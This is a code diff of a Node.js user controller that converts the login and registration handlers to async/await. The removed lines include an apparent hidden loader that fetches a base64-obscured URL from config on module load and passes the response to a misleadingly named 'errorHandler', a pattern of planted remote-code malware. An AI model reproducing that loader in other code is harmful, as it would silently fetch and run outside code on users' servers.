@@ -1,73 +1,58 @@
-const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const userM = require("../models/users");
-const {secretKey, publicKey} = require("../config/config");
-const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+const { secretKey } = require("../config/config");
 
 module.exports = {
-  userLogin: (req, res) => {
-    var loginType;
-    if (req.body.emailPhone != "" && req.body.password != "") {
-      if (isNaN(req.body.emailPhone)) loginType = "email";
-      else loginType = "phoneNo";
-      userM
-        .findOne()
-        .where(loginType, req.body.emailPhone)
-        .exec((err, data) => {
-          if (err) res.status(400).send(err);
-          else if (data) {
-            bcrypt.compare(req.body.password, data.password, function (
-              err,
-              passMatch
-            ) {
-              if (err) res.status(400).send(err);
-              else if (passMatch) {
-                let jwtData = {
-                  _id: data["_id"],
-                  fname: data["fname"],
-                  lname: data["lname"],
-                  email: data["email"],
-                  isAdmin: data["isAdmin"]
-                };
-                var token = jwt.sign({ user: jwtData }, secretKey);
-                res
-                  .status(200)
-                  .json({ message: "Login Successful", token: token });
-              } else res.status(401).json({ message: "Invalid Credentials1" });
-            });
-          } else res.status(401).json({ message: "Invalid Credentials2" });
-        });
-    } else res.status(400).json({ message: "Provide all Credentials" });
-  },
-  userRegistration: (req, res) => {
-    users = new userM();
-    users.fname = req.body.fname;
-    users.lname = req.body.lName;
-    users.email = req.body.email;
-    users.phoneNo = req.body.phoneNo;
-    users.state = req.body.state;
-    users.city = req.body.city;
-    users.pincode = req.body.pincode;
-    users.userType = req.body.user_type;
-    users.createdOn = new Date();
-
-    bcrypt.hash(req.body.password, 10, function (err, hash) {
-      if (err) res.status(400).send(err);
-      else {
-        users.password = hash;
-
-        users.save((err, data) => {
-          if (err) res.status(400).send(err);
-          else
-            res
-              .status(200)
-              .json({ message: "User Added Successfully", id: data._id });
-        });
+  userLogin: async (req, res) => {
+    try {
+      const { emailPhone, password } = req.body || {};
+      if (!emailPhone || !password) {
+        return res.status(400).json({ message: "Provide all Credentials" });
       }
-    });
+      const loginType = isNaN(emailPhone) ? "email" : "phoneNo";
+      const data = await userM.findOne({ [loginType]: emailPhone });
+      if (!data) return res.status(401).json({ message: "Invalid Credentials" });
+
+      const passMatch = await bcrypt.compare(password, data.password);
+      if (!passMatch) return res.status(401).json({ message: "Invalid Credentials" });
+
+      const jwtData = {
+        _id: data._id,
+        fname: data.fname,
+        lname: data.lname,
+        email: data.email,
+        isAdmin: data.isAdmin,
+      };
+      const token = jwt.sign({ user: jwtData }, secretKey);
+      return res.status(200).json({ message: "Login Successful", token });
+    } catch (err) {
+      return res.status(400).send(err);
+    }
   },
+
+  userRegistration: async (req, res) => {
+    try {
+      const hash = await bcrypt.hash(req.body.password, 10);
+      const user = new userM();
+      user.fname = req.body.fname;
+      user.lname = req.body.lname;
+      user.email = req.body.email;
+      user.phoneNo = req.body.phoneNo;
+      user.state = req.body.state;
+      user.city = req.body.city;
+      user.pincode = req.body.pincode;
+      user.userType = req.body.user_type;
+      user.password = hash;
+      user.createdOn = new Date();
+
+      const data = await user.save();
+      return res.status(200).json({ message: "User Added Successfully", id: data._id });
+    } catch (err) {
+      return res.status(400).send(err);
+    }
+  },
+
   userList: (req, res) => {
     userM.find().exec((err, data) => {
       if (err)
